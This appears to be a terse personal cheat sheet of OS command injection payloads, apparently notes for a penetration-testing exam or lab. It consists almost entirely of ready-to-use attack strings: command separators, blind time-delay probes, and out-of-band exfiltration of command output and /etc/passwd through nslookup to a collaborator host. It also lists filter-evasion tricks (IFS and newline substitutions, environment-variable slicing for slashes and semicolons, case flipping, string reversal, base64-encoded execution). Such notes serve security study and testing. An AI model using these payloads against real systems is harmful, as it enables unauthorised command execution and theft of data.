- Submit Feedback Section
- Comment Param
- Email Param
-  I found it on admin pic second paramter

#  Normal Injection

```
# Linux 
whoami
uname -a
ifconifg
netstat -an
ps -ef
# Windows
whoami
ver
ipconfig /all
netstat -an
tasklist
```

# Blind Injection - Time Delays
```
& ping -c 10 127.0.0.1 &
```

# more ways
Redirect to file
```
& whoami > /var/www/images/out.txt &
```

Out of band
```
& nslookup <collaborator> &
```
Exfil
```
& nslookup `whoami`.<collaborator> &
```

```
email=x||nslookup+x.BURP-COLLABORATOR-SUBDOMAIN||
```

```
# Both windows & unix
&
&&
|
||

# Only unix
;
0x0a or \n ( new line character )

# To inject commands
`pwd`
$(pwd)
```

```
nslookup -q=cname $(cat file).server
```

# Exam
```
|nslookup+$(cat+/etc/passwd).<collaborator>%26
```

# Bypass space checks

```
127.0.0.1%0a${IFS}
```

```
{ls,-la}
```

# Newline

```
127.0.0.1%0a$
```

# tab

```
%09
```
# Slashes
```
echo ${PATH}
```

```
echo ${PATH:0:1}
```

### WIN:
CMD:
```
echo %HOMEPATH:~6,-11%
```
PS:
```
$env:HOMEPATH[0]
```
# Semicolon
```
echo ${LS_COLORS:10:1}
```
or
```
echo ${LS_COLORS:4:1}
```

# case bypass
```
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
```

# reverse

```
$(rev<<<'imaohw')
```

win:
```
iex "$('imaohw'[-1..-20] -join '')"
```

# B64

```
echo -n 'cat /etc/passwd | grep 33' | base64
```

```
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
```